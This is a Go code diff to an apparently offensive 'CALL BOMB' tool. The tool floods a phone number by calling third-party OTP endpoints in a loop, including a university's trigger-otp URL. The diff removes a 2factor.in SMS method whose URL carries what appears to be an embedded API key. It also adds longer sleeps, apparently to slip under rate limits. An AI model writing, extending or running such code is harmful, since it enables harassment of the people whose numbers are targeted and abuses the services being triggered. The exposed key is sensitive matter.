@@ -60,11 +60,11 @@ func main() {
 		pauses("Please enter a valid number of times!", 1)
 	}
 	var typeofc int
-	fmt.Print("Enter the type of call you would like to BOMB, Enter 1, 2 or 3; 1 and 3 is using POST and 2 is using GET method, rest all diffrent:\n")
+	fmt.Print("Enter the type of call you would like to BOMB, Enter 1 or 2:\n")
 	if _, err = fmt.Scan(&typeofc); err != nil {
 		pauses(err.Error(), 1)
 	}
-	log.Printf("Starting CALL BOMB; Please wait for %d seconds ...\n", (times-1)*15)
+	log.Printf("Starting CALL BOMB; Please wait for general %d seconds ...\n", (times-1)*15)
 	if typeofc == 1 {
 		for i := 0; i < times; i++ {
 			postData, _ := json.Marshal(map[string]string{"phone": phoneNumber})
@@ -83,22 +83,14 @@ func main() {
 				break
 			}
 			log.Println(i)
+			if i+1 >= 15 {
+				log.Printf("Sleeping for %d seconds ...\n", 65)
+				time.Sleep(65 * time.Second)
+				continue
+			}
 			time.Sleep(15 * time.Second)
 		}
 	} else if typeofc == 2 {
-		for i := 0; i < times; i++ {
-			resp, err := http.Get(fmt.Sprintf("https://2factor.in/API/V1/49e550ce-304d-11ee-addf-0200cd936042/SMS/+91%s/AUTOGEN/ELITEW", phoneNumber))
-			if err != nil {
-				pauses(err.Error(), 1)
-			}
-			_ = resp.Body.Close()
-			if i+1 == times {
-				break
-			}
-			log.Println(i)
-			time.Sleep(15 * time.Second)
-		}
-	} else if typeofc == 3 {
 		for i := 0; i < times; i++ {
 			postData, _ := json.Marshal(map[string]string{"phone": phoneNumber})
 			req, _ := http.NewRequest("POST", "https://emasters.iitk.ac.in/extras/trigger-otp", bytes.NewBuffer(postData))
@@ -115,10 +107,15 @@ func main() {
 				break
 			}
 			log.Println(i)
+			if i+1 >= 15 {
+				log.Printf("Sleeping for %d seconds ...\n", 65)
+				time.Sleep(65 * time.Second)
+				continue
+			}
 			time.Sleep(15 * time.Second)
 		}
 	} else {
-		pauses("Please enter 1, 2 or 3 in type!", 1)
+		pauses("Please enter 1 or 2 in type!", 1)
 	}
 	pauses("Success!\nBye!", 0)
 }
